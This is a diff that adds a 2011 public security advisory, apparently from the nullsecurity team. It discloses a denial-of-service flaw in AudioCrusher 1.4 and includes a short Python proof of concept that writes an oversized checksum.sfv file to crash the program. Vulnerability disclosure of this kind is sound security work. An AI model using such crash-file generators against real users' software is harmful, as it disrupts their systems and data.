@@ -1,0 +1,91 @@
+===============================================================================
+|                                                                             |
+                         ____                     _ __
+              ___  __ __/ / /__ ___ ______ ______(_) /___ __
+             / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /
+            /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /
+                                                     /___/ team
+
+                          PUBLIC SECURITY ADVISORY
+|                                                                             |
+===============================================================================
+
+
+TITLE
+=====
+
+AudioCrusher Denial of Sevice PoC
+
+
+AUTHOR
+======
+
+Zy0d0x
+
+
+DATE
+====
+
+02-11-2011
+
+
+VENDOR
+======
+
+AudioCrusher - http://www.sysdesk.de/
+
+
+AFFECTED PRODUCT
+================
+
+AudioCrusher Version 1.4
+
+
+AFFECTED PLATFORMS
+==================
+
+Windows All 
+
+
+VULNERABILITY CLASS
+===================
+
+Denail Of Service
+
+
+PROOF OF CONCEPT
+================
+
+The following python code can be used to crash the application:
+
+--- SNIP ---
+buffer = "\x41" * 50000
+
+f = open("checksum.sfv","w")
+f.write(buffer)
+f.close
+
+print("\nFile Created\n")
+--- SNIP ---
+
+
+THREAT LEVEL
+============
+
+Low
+
+
+STATUS
+======
+
+Not Fixed 
+
+
+DISCLAIMER
+==========
+
+nullsecurity.net hereby emphasize, that the information which is published here are
+for education purposes only. nullsecurity.net does not take any responsibility for
+any abuse or misusage!
+
+                Copyright (c) 2011 - nullsecurity.net
